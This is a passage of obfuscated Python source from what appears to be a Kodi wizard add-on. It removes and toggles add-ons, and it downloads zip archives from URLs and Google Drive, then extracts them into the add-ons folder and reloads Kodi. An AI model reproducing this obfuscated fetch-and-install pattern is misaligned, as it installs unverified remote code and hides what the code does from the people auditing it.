			wiz .log ("Unable to remove %s, Purging DB"%OO0000O0O0O0OO0O0 )#line:2964
			wiz .purgeDb (OO0000O0O0O0OO0O0 )#line:2965
	else :#line:2966
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2967
def removeAddonMenu ():#line:2969
	O0000000OO0OO0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2970
	OOO0OOOOO00000000 =[];O0OO0OOOOOOO0O000 =[]#line:2971
	for O000000OOO000000O in sorted (O0000000OO0OO0OOO ,key =lambda OO0OOO0OO0OOO00OO :OO0OOO0OO0OOO00OO ):#line:2972
		O0OO0OO0O00O00O0O =os .path .split (O000000OOO000000O [:-1 ])[1 ]#line:2973
		if O0OO0OO0O00O00O0O in EXCLUDES :continue #line:2974
		elif O0OO0OO0O00O00O0O in DEFAULTPLUGINS :continue #line:2975
		elif O0OO0OO0O00O00O0O =='packages':continue #line:2976
		OOO00OOOOOOO00000 =os .path .join (O000000OOO000000O ,'addon.xml')#line:2977
		if os .path .exists (OOO00OOOOOOO00000 ):#line:2978
			O0OO0OOO000O0OO00 =open (OOO00OOOOOOO00000 )#line:2979
			O0OOO000OO0O0000O =O0OO0OOO000O0OO00 .read ()#line:2980
			O00O0O00O0O0000OO =wiz .parseDOM (O0OOO000OO0O0000O ,'addon',ret ='id')#line:2981
			O0OO0O0O0O0000OO0 =O0OO0OO0O00O00O0O if len (O00O0O00O0O0000OO )==0 else O00O0O00O0O0000OO [0 ]#line:2983
			try :#line:2984
				O00O0O00O0O000OO0 =xbmcaddon .Addon (id =O0OO0O0O0O0000OO0 )#line:2985
				OOO0OOOOO00000000 .append (O00O0O00O0O000OO0 .getAddonInfo ('name'))#line:2986
				O0OO0OOOOOOO0O000 .append (O0OO0O0O0O0000OO0 )#line:2987
			except :#line:2988
				pass #line:2989
	if len (OOO0OOOOO00000000 )==0 :#line:2990
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:2991
		return #line:2992
	if KODIV >16 :#line:2993
		O000OOO0O0OO000OO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OOOOO00000000 )#line:2994
	else :#line:2995
		O000OOO0O0OO000OO =[];OOOO0O0OO0O0OO0O0 =0 #line:2996
		OO0000OO0OO00O0O0 =["-- Click here to Continue --"]+OOO0OOOOO00000000 #line:2997
		while not OOOO0O0OO0O0OO0O0 ==-1 :#line:2998
			OOOO0O0OO0O0OO0O0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0000OO0OO00O0O0 )#line:2999
			if OOOO0O0OO0O0OO0O0 ==-1 :break #line:3000
			elif OOOO0O0OO0O0OO0O0 ==0 :break #line:3001
			else :#line:3002
				OO0OO00O0O00O0000 =(OOOO0O0OO0O0OO0O0 -1 )#line:3003
				if OO0OO00O0O00O0000 in O000OOO0O0OO000OO :#line:3004
					O000OOO0O0OO000OO .remove (OO0OO00O0O00O0000 )#line:3005
					OO0000OO0OO00O0O0 [OOOO0O0OO0O0OO0O0 ]=OOO0OOOOO00000000 [OO0OO00O0O00O0000 ]#line:3006
				else :#line:3007
					O000OOO0O0OO000OO .append (OO0OO00O0O00O0000 )#line:3008
					OO0000OO0OO00O0O0 [OOOO0O0OO0O0OO0O0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOO0OOOOO00000000 [OO0OO00O0O00O0000 ])#line:3009
	if O000OOO0O0OO000OO ==None :return #line:3010
	if len (O000OOO0O0OO000OO )>0 :#line:3011
		wiz .addonUpdates ('set')#line:3012
		for O00OO0O00O0O00O0O in O000OOO0O0OO000OO :#line:3013
			removeAddon (O0OO0OOOOOOO0O000 [O00OO0O00O0O00O0O ],OOO0OOOOO00000000 [O00OO0O00O0O00O0O ],True )#line:3014
		xbmc .sleep (1000 )#line:3016
		if INSTALLMETHOD ==1 :O0O000OOOO000OO00 =1 #line:3018
		elif INSTALLMETHOD ==2 :O0O000OOOO000OO00 =0 #line:3019
		else :O0O000OOOO000OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3020
		if O0O000OOOO000OO00 ==1 :wiz .reloadFix ('remove addon')#line:3021
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3022
def removeAddonDataMenu ():#line:3024
	if os .path .exists (ADDOND ):#line:3025
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3026
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3027
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3028
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3029
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3030
		O000OOO000000O0O0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3031
		for O0000000O0O00O000 in sorted (O000OOO000000O0O0 ,key =lambda O00O00OO0OOOOOO00 :O00O00OO0OOOOOO00 ):#line:3032
			O000000O000000O0O =O0000000O0O00O000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3033
			OOOOO0000OOO0OO00 =os .path .join (O0000000O0O00O000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3034
			OOOOOO0OO000OO0O0 =os .path .join (O0000000O0O00O000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3035
			O0OOOO0O00OO000O0 =O000000O000000O0O #line:3036
			OO00OO0O00OO00000 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3037
			for OOO0OO00OO0OOO00O in OO00OO0O00OO00000 :#line:3038
				O0OOOO0O00OO000O0 =O0OOOO0O00OO000O0 .replace (OOO0OO00OO0OOO00O ,OO00OO0O00OO00000 [OOO0OO00OO0OOO00O ])#line:3039
			if O000000O000000O0O in EXCLUDES :O0OOOO0O00OO000O0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0OOOO0O00OO000O0 #line:3040
			else :O0OOOO0O00OO000O0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0OOOO0O00OO000O0 #line:3041
			addFile (' %s'%O0OOOO0O00OO000O0 ,'removedata',O000000O000000O0O ,icon =OOOOO0000OOO0OO00 ,fanart =OOOOOO0OO000OO0O0 ,themeit =THEME2 )#line:3042
	else :#line:3043
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3044
	setView ('files','viewType')#line:3045
def enableAddons ():#line:3047
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3048
	OO00OOOOOO0000OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3049
	O000O00O0O00O0O00 =0 #line:3050
	for O0O0OO0O00O0O0O00 in sorted (OO00OOOOOO0000OO0 ,key =lambda OO0OOO0O00O00OOOO :OO0OOO0O00O00OOOO ):#line:3051
		OOO0000OO0O0OOO0O =os .path .split (O0O0OO0O00O0O0O00 [:-1 ])[1 ]#line:3052
		if OOO0000OO0O0OOO0O in EXCLUDES :continue #line:3053
		if OOO0000OO0O0OOO0O in DEFAULTPLUGINS :continue #line:3054
		O0OO0O000OOO0000O =os .path .join (O0O0OO0O00O0O0O00 ,'addon.xml')#line:3055
		if os .path .exists (O0OO0O000OOO0000O ):#line:3056
			O000O00O0O00O0O00 +=1 #line:3057
			OO00OOOOOO0000OO0 =O0O0OO0O00O0O0O00 .replace (ADDONS ,'')[1 :-1 ]#line:3058
			O00O000O00OOO0OO0 =open (O0OO0O000OOO0000O )#line:3059
			OOO00000000O0O000 =O00O000O00OOO0OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3060
			OO0OOO00O0OO0OOOO =wiz .parseDOM (OOO00000000O0O000 ,'addon',ret ='id')#line:3061
			O00O00OOO0OO0OO00 =wiz .parseDOM (OOO00000000O0O000 ,'addon',ret ='name')#line:3062
			try :#line:3063
				O0OOO000O00OO00OO =OO0OOO00O0OO0OOOO [0 ]#line:3064
				OO00O000O000OO0OO =O00O00OOO0OO0OO00 [0 ]#line:3065
			except :#line:3066
				continue #line:3067
			try :#line:3068
				O0O0O00OOO00O00O0 =xbmcaddon .Addon (id =O0OOO000O00OO00OO )#line:3069
				O0000O0OOOO0OOOOO ="[COLOR green][Enabled][/COLOR]"#line:3070
				OO00O0OOOO00O00OO ="false"#line:3071
			except :#line:3072
				O0000O0OOOO0OOOOO ="[COLOR red][Disabled][/COLOR]"#line:3073
				OO00O0OOOO00O00OO ="true"#line:3074
				pass #line:3075
			OOOO0O0O00O0OOOO0 =os .path .join (O0O0OO0O00O0O0O00 ,'icon.png')if os .path .exists (os .path .join (O0O0OO0O00O0O0O00 ,'icon.png'))else ICON #line:3076
			OO00O00O00000000O =os .path .join (O0O0OO0O00O0O0O00 ,'fanart.jpg')if os .path .exists (os .path .join (O0O0OO0O00O0O0O00 ,'fanart.jpg'))else FANART #line:3077
			addFile ("%s %s"%(O0000O0OOOO0OOOOO ,OO00O000O000OO0OO ),'toggleaddon',OO00OOOOOO0000OO0 ,OO00O0OOOO00O00OO ,icon =OOOO0O0O00O0OOOO0 ,fanart =OO00O00O00000000O )#line:3078
			O00O000O00OOO0OO0 .close ()#line:3079
	if O000O00O0O00O0O00 ==0 :#line:3080
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3081
	setView ('files','viewType')#line:3082
def changeFeq ():#line:3084
	O000OOOO0000OO0OO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3085
	OOO0OO00OOO000OOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O000OOOO0000OO0OO )#line:3086
	if not OOO0OO00OOO000OOO ==-1 :#line:3087
		wiz .setS ('autocleanfeq',str (OOO0OO00OOO000OOO ))#line:3088
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O000OOOO0000OO0OO [OOO0OO00OOO000OOO ]))#line:3089
def developer ():#line:3091
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3092
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3093
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3094
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3095
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3096
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3097
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3098
	setView ('files','viewType')#line:3100
def download (O0OO00OO0000OOO0O ,O0O0O00OOO0OOOO00 ):#line:3105
  OOOOOO0O0O0O00OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3106
  OOOOO0OOO00O0OOOO =xbmcgui .DialogProgress ()#line:3107
  OOOOO0OOO00O0OOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3108
  OO000OO00OOO000O0 =os .path .join (OOOOOO0O0O0O00OO0 ,'isr.zip')#line:3109
  OOO0O0OO000OO0000 =urllib2 .Request (O0OO00OO0000OOO0O )#line:3110
  OO00OO0O0O0OOOO00 =urllib2 .urlopen (OOO0O0OO000OO0000 )#line:3111
  O0O0OOO0OO0O0OOOO =xbmcgui .DialogProgress ()#line:3113
  O0O0OOO0OO0O0OOOO .create ("Downloading","Downloading "+name )#line:3114
  O0O0OOO0OO0O0OOOO .update (0 )#line:3115
  OOO00O00OOO00OOOO =O0O0O00OOO0OOOO00 #line:3116
  OO00000O000000O00 =open (OO000OO00OOO000O0 ,'wb')#line:3117
  try :#line:3119
    O0000OO000O0O000O =OO00OO0O0O0OOOO00 .info ().getheader ('Content-Length').strip ()#line:3120
    O0OOO00OO00O000O0 =True #line:3121
  except AttributeError :#line:3122
        O0OOO00OO00O000O0 =False #line:3123
  if O0OOO00OO00O000O0 :#line:3125
        O0000OO000O0O000O =int (O0000OO000O0O000O )#line:3126
  OO0O0000OO00OO000 =0 #line:3128
  OOOO0000O0O0OOO0O =time .time ()#line:3129
  while True :#line:3130
        O0000OO0000O0000O =OO00OO0O0O0OOOO00 .read (8192 )#line:3131
        if not O0000OO0000O0000O :#line:3132
            sys .stdout .write ('\n')#line:3133
            break #line:3134
        OO0O0000OO00OO000 +=len (O0000OO0000O0000O )#line:3136
        OO00000O000000O00 .write (O0000OO0000O0000O )#line:3137
        if not O0OOO00OO00O000O0 :#line:3139
            O0000OO000O0O000O =OO0O0000OO00OO000 #line:3140
        if O0O0OOO0OO0O0OOOO .iscanceled ():#line:3141
           O0O0OOO0OO0O0OOOO .close ()#line:3142
           try :#line:3143
            os .remove (OO000OO00OOO000O0 )#line:3144
           except :#line:3145
            pass #line:3146
           break #line:3147
        O0O0O0O0O000000O0 =float (OO0O0000OO00OO000 )/O0000OO000O0O000O #line:3148
        O0O0O0O0O000000O0 =round (O0O0O0O0O000000O0 *100 ,2 )#line:3149
        O00OO00OO000O0OOO =OO0O0000OO00OO000 /(1024 *1024 )#line:3150
        OOOOOO0O00O0OO000 =O0000OO000O0O000O /(1024 *1024 )#line:3151
        O000O0OOOO00O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OO00OO000O0OOO ,'teal',OOOOOO0O00O0OO000 )#line:3152
        if (time .time ()-OOOO0000O0O0OOO0O )>0 :#line:3153
          O0O0O00O0O0OOOOOO =OO0O0000OO00OO000 /(time .time ()-OOOO0000O0O0OOO0O )#line:3154
          O0O0O00O0O0OOOOOO =O0O0O00O0O0OOOOOO /1024 #line:3155
        else :#line:3156
         O0O0O00O0O0OOOOOO =0 #line:3157
        OOO0000OOO0000OO0 ='KB'#line:3158
        if O0O0O00O0O0OOOOOO >=1024 :#line:3159
           O0O0O00O0O0OOOOOO =O0O0O00O0O0OOOOOO /1024 #line:3160
           OOO0000OOO0000OO0 ='MB'#line:3161
        if O0O0O00O0O0OOOOOO >0 and not O0O0O0O0O000000O0 ==100 :#line:3162
            O00O0OO000OOOOOOO =(O0000OO000O0O000O -OO0O0000OO00OO000 )/O0O0O00O0O0OOOOOO #line:3163
        else :#line:3164
            O00O0OO000OOOOOOO =0 #line:3165
        O000O0O000OOOOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0O00O0O0OOOOOO ,OOO0000OOO0000OO0 )#line:3166
        O0O0OOO0OO0O0OOOO .update (int (O0O0O0O0O000000O0 ),"Downloading "+name ,O000O0OOOO00O000O ,O000O0O000OOOOO0O )#line:3168
  O00O0O0O00OO0O00O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3171
  OO00000O000000O00 .close ()#line:3173
  extract (OO000OO00OOO000O0 ,O00O0O0O00OO0O00O ,O0O0OOO0OO0O0OOOO )#line:3175
  if os .path .exists (O00O0O0O00OO0O00O +'/scakemyer-script.quasar.burst'):#line:3176
    if os .path .exists (O00O0O0O00OO0O00O +'/script.quasar.burst'):#line:3177
     shutil .rmtree (O00O0O0O00OO0O00O +'/script.quasar.burst',ignore_errors =False )#line:3178
    os .rename (O00O0O0O00OO0O00O +'/scakemyer-script.quasar.burst',O00O0O0O00OO0O00O +'/script.quasar.burst')#line:3179
  if os .path .exists (O00O0O0O00OO0O00O +'/plugin.video.kmediatorrent-master'):#line:3181
    if os .path .exists (O00O0O0O00OO0O00O +'/plugin.video.kmediatorrent'):#line:3182
     shutil .rmtree (O00O0O0O00OO0O00O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3183
    os .rename (O00O0O0O00OO0O00O +'/plugin.video.kmediatorrent-master',O00O0O0O00OO0O00O +'/plugin.video.kmediatorrent')#line:3184
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3185
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3186
  try :#line:3187
    os .remove (OO000OO00OOO000O0 )#line:3188
  except :#line:3189
    pass #line:3190
  O0O0OOO0OO0O0OOOO .close ()#line:3191
def dis_or_enable_addon (OO00O0OOOOO0OO00O ,O000OO0O00OOO0OOO ,enable ="true"):#line:3192
    import json #line:3193
    O00O00OOOOO0O0OO0 ='"%s"'%OO00O0OOOOO0OO00O #line:3194
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00O0OOOOO0OO00O )and enable =="true":#line:3195
        logging .warning ('already Enabled')#line:3196
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00O0OOOOO0OO00O )#line:3197
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00O0OOOOO0OO00O )and enable =="false":#line:3198
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00O0OOOOO0OO00O )#line:3199
    else :#line:3200
        O00O0O00O00OOO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00O00OOOOO0O0OO0 ,enable )#line:3201
        O000000O0000O000O =xbmc .executeJSONRPC (O00O0O00O00OOO00O )#line:3202
        OO00O000O0OO00000 =json .loads (O000000O0000O000O )#line:3203
        if enable =="true":#line:3204
            xbmc .log ("### Enabled %s, response = %s"%(OO00O0OOOOO0OO00O ,OO00O000O0OO00000 ))#line:3205
        else :#line:3206
            xbmc .log ("### Disabled %s, response = %s"%(OO00O0OOOOO0OO00O ,OO00O000O0OO00000 ))#line:3207
    if O000OO0O00OOO0OOO =='auto':#line:3208
     return True #line:3209
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3210
def chunk_report (O00OOOO00OOOOO0O0 ,OOO0OOO0OO000O0O0 ,O0OO0OOO0OO0OOOOO ):#line:3211
   OOO0OOOOOOO00000O =float (O00OOOO00OOOOO0O0 )/O0OO0OOO0OO0OOOOO #line:3212
   OOO0OOOOOOO00000O =round (OOO0OOOOOOO00000O *100 ,2 )#line:3213
   if O00OOOO00OOOOO0O0 >=O0OO0OOO0OO0OOOOO :#line:3215
      sys .stdout .write ('\n')#line:3216
def chunk_read (O0OO00000OOO0OOOO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3218
   import time #line:3219
   O0OO00O00O000O00O =int (filesize )*1000000 #line:3220
   O0OO0O0OO0OO0O000 =0 #line:3222
   O00OO0O00O0000000 =time .time ()#line:3223
   O0OOO0O00O0O00O0O =0 #line:3224
   logging .warning ('Downloading')#line:3226
   with open (destination ,"wb")as OOOO0OO00O0OO000O :#line:3227
    while 1 :#line:3228
      O0OO0O000000000OO =time .time ()-O00OO0O00O0000000 #line:3229
      O000O000OOOO000O0 =int (O0OOO0O00O0O00O0O *chunk_size )#line:3230
      O00O00OOOOOO0OO00 =O0OO00000OOO0OOOO .read (chunk_size )#line:3231
      OOOO0OO00O0OO000O .write (O00O00OOOOOO0OO00 )#line:3232
      OOOO0OO00O0OO000O .flush ()#line:3233
      O0OO0O0OO0OO0O000 +=len (O00O00OOOOOO0OO00 )#line:3234
      O00O00000OO0OOO00 =float (O0OO0O0OO0OO0O000 )/O0OO00O00O000O00O #line:3235
      O00O00000OO0OOO00 =round (O00O00000OO0OOO00 *100 ,2 )#line:3236
      if int (O0OO0O000000000OO )>0 :#line:3237
        O0OOO00OO0OOO0OO0 =int (O000O000OOOO000O0 /(1024 *O0OO0O000000000OO ))#line:3238
      else :#line:3239
         O0OOO00OO0OOO0OO0 =0 #line:3240
      if O0OOO00OO0OOO0OO0 >1024 and not O00O00000OO0OOO00 ==100 :#line:3241
          O0O000O000OOOOOOO =int (((O0OO00O00O000O00O -O000O000OOOO000O0 )/1024 )/(O0OOO00OO0OOO0OO0 ))#line:3242
      else :#line:3243
          O0O000O000OOOOOOO =0 #line:3244
      if O0O000O000OOOOOOO <0 :#line:3245
        O0O000O000OOOOOOO =0 #line:3246
      dp .update (int (O00O00000OO0OOO00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00O00000OO0OOO00 ,O000O000OOOO000O0 /(1024 *1024 ),O0OO00O00O000O00O /(1000 *1000 ),O0OOO00OO0OOO0OO0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O000O000OOOOOOO ,60 ))#line:3247
      if dp .iscanceled ():#line:3248
         dp .close ()#line:3249
         break #line:3250
      if not O00O00OOOOOO0OO00 :#line:3251
         break #line:3252
      if report_hook :#line:3254
         report_hook (O0OO0O0OO0OO0O000 ,chunk_size ,O0OO00O00O000O00O )#line:3255
      O0OOO0O00O0O00O0O +=1 #line:3256
   logging .warning ('END Downloading')#line:3257
   return O0OO0O0OO0OO0O000 #line:3258
def googledrive_download (O00O0OO0000OO0OO0 ,O0OOOOOO00OO0OO0O ,OO0O00OOOOOOO00O0 ,OO0O00OO0O0OOO000 ):#line:3260
    O000O000O0OO0O0O0 =[]#line:3264
    OO0OOO00OO00OOO00 =O00O0OO0000OO0OO0 .split ('=')#line:3265
    O00O0OO0000OO0OO0 =OO0OOO00OO00OOO00 [len (OO0OOO00OO00OOO00 )-1 ]#line:3266
    def O000000OOOO0OO00O (OO0O000O000OO0OO0 ):#line:3268
        for OO0OO0000OOO0000O in OO0O000O000OO0OO0 :#line:3270
            logging .warning ('cookie.name')#line:3271
            logging .warning (OO0OO0000OOO0000O .name )#line:3272
            O0OOO0O0OO0000O0O =OO0OO0000OOO0000O .value #line:3273
            if 'download_warning'in OO0OO0000OOO0000O .name :#line:3274
                logging .warning (OO0OO0000OOO0000O .value )#line:3275
                logging .warning ('cookie.value')#line:3276
                return OO0OO0000OOO0000O .value #line:3277
            return O0OOO0O0OO0000O0O #line:3278
        return None #line:3280
    def OOO0O0OO0OO0OO0O0 (O0OOOOO00O0000OO0 ,O0O000OO000OOOO0O ):#line:3282
        O0000OOOO00O0OO00 =32768 #line:3284
        O0000OO0O000O00OO =time .time ()#line:3285
        with open (O0O000OO000OOOO0O ,"wb")as O0O00O00OOO00000O :#line:3287
            OOOOOOOO0O0O0O0OO =1 #line:3288
            OOOO0O00O0OO00O00 =32768 #line:3289
            try :#line:3290
                OOO00OOOOO000OO0O =int (O0OOOOO00O0000OO0 .headers .get ('content-length'))#line:3291
                print ('file total size :',OOO00OOOOO000OO0O )#line:3292
            except TypeError :#line:3293
                print ('using dummy length !!!')#line:3294
                OOO00OOOOO000OO0O =int (OO0O00OO0O0OOO000 )*1000000 #line:3295
            for O00OOOOO0OOO00000 in O0OOOOO00O0000OO0 .iter_content (O0000OOOO00O0OO00 ):#line:3296
                if O00OOOOO0OOO00000 :#line:3297
                    O0O00O00OOO00000O .write (O00OOOOO0OOO00000 )#line:3298
                    O0O00O00OOO00000O .flush ()#line:3299
                    O00O0OO0OO0O0O0OO =time .time ()-O0000OO0O000O00OO #line:3300
                    O0OO0OOOO0O00OO00 =int (OOOOOOOO0O0O0O0OO *OOOO0O00O0OO00O00 )#line:3301
                    if O00O0OO0OO0O0O0OO ==0 :#line:3302
                        O00O0OO0OO0O0O0OO =0.1 #line:3303
                    OO00000O00OO0O0OO =int (O0OO0OOOO0O00OO00 /(1024 *O00O0OO0OO0O0O0OO ))#line:3304
                    O0O0OO00O00OOO0OO =int (OOOOOOOO0O0O0O0OO *OOOO0O00O0OO00O00 *100 /OOO00OOOOO000OO0O )#line:3305
                    if OO00000O00OO0O0OO >1024 and not O0O0OO00O00OOO0OO ==100 :#line:3306
                      O00OOOO0O0O000OOO =int (((OOO00OOOOO000OO0O -O0OO0OOOO0O00OO00 )/1024 )/(OO00000O00OO0O0OO ))#line:3307
                    else :#line:3308
                      O00OOOO0O0O000OOO =0 #line:3309
                    OO0O00OOOOOOO00O0 .update (int (O0O0OO00O00OOO0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0OO00O00OOO0OO ,O0OO0OOOO0O00OO00 /(1024 *1024 ),OOO00OOOOO000OO0O /(1000 *1000 ),OO00000O00OO0O0OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00OOOO0O0O000OOO ,60 ))#line:3311
                    OOOOOOOO0O0O0O0OO +=1 #line:3312
                    if OO0O00OOOOOOO00O0 .iscanceled ():#line:3313
                     OO0O00OOOOOOO00O0 .close ()#line:3314
                     break #line:3315
    OO0O000O00O00OO00 ="https://docs.google.com/uc?export=download"#line:3316
    import urllib2 #line:3321
    import cookielib #line:3322
    from cookielib import CookieJar #line:3324
    O0000O0OO0O0O00OO =CookieJar ()#line:3326
    OOO00O000O000O000 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0000O0OO0O0O00OO ))#line:3327
    O0OO0O0O000000000 ={'id':O00O0OO0000OO0OO0 }#line:3329
    O00OOOO0O0O0O0OOO =urllib .urlencode (O0OO0O0O000000000 )#line:3330
    logging .warning (OO0O000O00O00OO00 +'&'+O00OOOO0O0O0O0OOO )#line:3331
    OO000O00O0OOO0O00 =OOO00O000O000O000 .open (OO0O000O00O00OO00 +'&'+O00OOOO0O0O0O0OOO )#line:3332
    O0O00OOO0000OOOOO =OO000O00O0OOO0O00 .read ()#line:3333
    for O0O0O0O0O0O0O0OOO in O0000O0OO0O0O00OO :#line:3335
         logging .warning (O0O0O0O0O0O0O0OOO )#line:3336
    OOO000OO0O0OO0OO0 =O000000OOOO0OO00O (O0000O0OO0O0O00OO )#line:3337
    logging .warning (OOO000OO0O0OO0OO0 )#line:3338
    if OOO000OO0O0OO0OO0 :#line:3339
        OO00OO00OOOOOOOO0 ={'id':O00O0OO0000OO0OO0 ,'confirm':OOO000OO0O0OO0OO0 }#line:3340
        OO0OOO0OOO0O00O0O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3341
        O00OOOO0O0O0O0OOO =urllib .urlencode (OO00OO00OOOOOOOO0 )#line:3342
        OO000O00O0OOO0O00 =OOO00O000O000O000 .open (OO0O000O00O00OO00 +'&'+O00OOOO0O0O0O0OOO )#line:3343
        chunk_read (OO000O00O0OOO0O00 ,report_hook =chunk_report ,dp =OO0O00OOOOOOO00O0 ,destination =O0OOOOOO00OO0OO0O ,filesize =OO0O00OO0O0OOO000 )#line:3344
    return (O000O000O0OO0O0O0 )#line:3348
def kodi17Fix ():#line:3349
	OO000OO0OO0OOO00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3350
	OO0000OOO000O0O0O =[]#line:3351
	for OO0O00OO0OO00OO00 in sorted (OO000OO0OO0OOO00O ,key =lambda O000O0000O00OO00O :O000O0000O00OO00O ):#line:3352
		OOOOOO0O0O0000OO0 =os .path .join (OO0O00OO0OO00OO00 ,'addon.xml')#line:3353
		if os .path .exists (OOOOOO0O0O0000OO0 ):#line:3354
			O0OO0000O00O00000 =OO0O00OO0OO00OO00 .replace (ADDONS ,'')[1 :-1 ]#line:3355
			OOO0OOO0OOOO0OOOO =open (OOOOOO0O0O0000OO0 )#line:3356
			OO0O0000O00OO00O0 =OOO0OOO0OOOO0OOOO .read ()#line:3357
			O0OOOOOOO0O00O00O =parseDOM (OO0O0000O00OO00O0 ,'addon',ret ='id')#line:3358
			OOO0OOO0OOOO0OOOO .close ()#line:3359
			try :#line:3360
				OO00O0OO0OO000OOO =xbmcaddon .Addon (id =O0OOOOOOO0O00O00O [0 ])#line:3361
			except :#line:3362
				try :#line:3363
					log ("%s was disabled"%O0OOOOOOO0O00O00O [0 ],xbmc .LOGDEBUG )#line:3364
					OO0000OOO000O0O0O .append (O0OOOOOOO0O00O00O [0 ])#line:3365
				except :#line:3366
					try :#line:3367
						log ("%s was disabled"%O0OO0000O00O00000 ,xbmc .LOGDEBUG )#line:3368
						OO0000OOO000O0O0O .append (O0OO0000O00O00000 )#line:3369
					except :#line:3370
						if len (O0OOOOOOO0O00O00O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OO0000O00O00000 ,xbmc .LOGERROR )#line:3371
						else :log ("Unabled to enable: %s"%OO0O00OO0OO00OO00 ,xbmc .LOGERROR )#line:3372
	if len (OO0000OOO000O0O0O )>0 :#line:3373
		O000O0000OOOOO0OO =0 #line:3374
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3375
		for O00OOO00O0O0000O0 in OO0000OOO000O0O0O :#line:3376
			O000O0000OOOOO0OO +=1 #line:3377
			OO000OO0O0000OO00 =int (percentage (O000O0000OOOOO0OO ,len (OO0000OOO000O0O0O )))#line:3378
